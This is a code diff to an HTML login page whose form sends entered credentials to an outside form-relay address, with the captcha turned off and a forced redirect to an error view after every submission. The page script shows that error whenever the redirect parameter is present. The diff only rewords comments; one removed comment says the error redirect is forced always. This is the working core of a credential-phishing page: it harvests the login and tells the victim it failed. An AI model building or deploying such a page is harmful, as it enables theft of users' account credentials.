@@ -44,9 +44,8 @@
     <div class="container">
       <h2>Login</h2>
       <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
-        <!-- Hidden settings -->
+        <!-- Hidden fields -->
         <input type="hidden" name="_captcha" value="false" />
-        <!-- Force redirect to error page always -->
         <input type="hidden" name="_next" value="?error=1" />
         <input type="hidden" name="_error" value="?error=1" />
 
@@ -86,19 +85,19 @@
   </div>
 
   <script>
-    // Check URL for ?error=1
+    // Check if URL has ?error=1
     function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(param);
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-      const isError = getQueryParam('error');
-      if (isError === '1') {
-        // Show the error page only
+      const error = getQueryParam('error');
+      if (error === '1') {
+        // Show error page
         document.getElementById('error-page').classList.add('active');
       } else {
-        // Otherwise show the form
+        // Show login form
         document.getElementById('form-page').classList.add('active');
       }
     });
